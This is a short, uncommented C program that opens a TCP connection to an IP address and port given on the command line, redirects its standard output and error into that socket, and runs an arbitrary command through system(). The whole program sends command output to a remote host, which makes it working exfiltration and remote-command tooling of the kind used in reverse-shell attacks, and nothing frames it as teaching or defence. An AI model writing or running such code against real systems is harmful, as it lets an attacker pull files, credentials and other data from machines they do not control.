#include <netinet/in.h>
#include <unistd.h>
#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include <arpa/inet.h>
#include <sys/socket.h>
int main(int argc, char *argv[]){
  int sfd=socket(AF_INET, SOCK_STREAM, 0);
  if (argc < 4){
     printf("Error, Usage: %s <command> <ip> <port>\n",argv[0]);
     exit(1);
  }
  struct sockaddr_in server;
  server.sin_port=htons(atoi(argv[3]));
  server.sin_family=AF_INET;
  inet_pton(AF_INET, argv[2], &server.sin_addr.s_addr);
  int cnt=connect(sfd, (struct sockaddr*)&server, sizeof(server));
  if (cnt==-1){
   printf ("Error Connecting to service, maybe it is unavailable\n");
   exit(1);
  }

  close(1);
  close(2);
  dup2(sfd,1);
  dup2(sfd,2);
  system(argv[1]);
  close(sfd);

}
